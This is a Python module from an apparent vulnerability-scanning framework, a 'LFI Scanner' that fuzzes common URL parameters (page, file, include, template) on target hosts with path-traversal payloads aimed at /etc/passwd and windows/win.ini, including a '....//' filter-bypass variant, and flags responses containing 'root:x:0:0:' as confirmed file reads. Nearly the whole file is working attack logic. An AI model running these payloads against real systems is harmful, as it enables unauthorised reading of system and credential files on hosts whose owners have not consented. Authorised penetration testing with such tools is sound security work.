import requests
from modules.base_module import AnalysisModule
from core.brain import log_message
import database as db

class LfiScannerModule(AnalysisModule):
    def __init__(self):
        super().__init__()
        self.name = "LFI Scanner"
        self.description = "Tests for Local File Inclusion vulnerabilities."
        self.payloads = [
            "../../../../../../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//....//etc/passwd",
            "../../../../windows/win.ini"
        ]
        self.test_params = ["page", "file", "doc", "view", "include", "template"]

    def run(self, target_id):
        target = db.get_target_by_id(target_id)
        if not target:
            return
            
        host = target['hostname']
        log_message("info", f"[{self.name}] Scanning {host} for LFI...")
        
        base_urls = [f"http://{host}", f"https://{host}"]
        vulnerable_urls = []

        for url in base_urls:
            try:
                if requests.get(url, timeout=3).status_code not in [200, 403]:
                    continue
                
                for param in self.test_params:
                    for payload in self.payloads:
                        fuzzed_url = f"{url}/?{param}={payload}"
                        try:
                            res = requests.get(fuzzed_url, timeout=3)
                            content = res.text.lower()
                            
                            # Indicators of success
                            if "root:x:0:0:" in content or "[extensions]" in content or "fonts" in content:
                                log_message("critical", f"[{self.name}] LFI CONFIRMED at {fuzzed_url}")
                                vulnerable_urls.append(fuzzed_url)
                                
                                db.add_vulnerability(
                                    target_id=target_id,
                                    vuln_type="LFI",
                                    description=f"Read system file via '{param}': {payload}",
                                    severity="critical"
                                )
                                break
                        except:
                            pass
            except:
                pass
                
        if vulnerable_urls:
            log_message("success", f"[{self.name}] Found {len(vulnerable_urls)} LFI vectors.")
        else:
            log_message("info", f"[{self.name}] No LFI found on common parameters.")
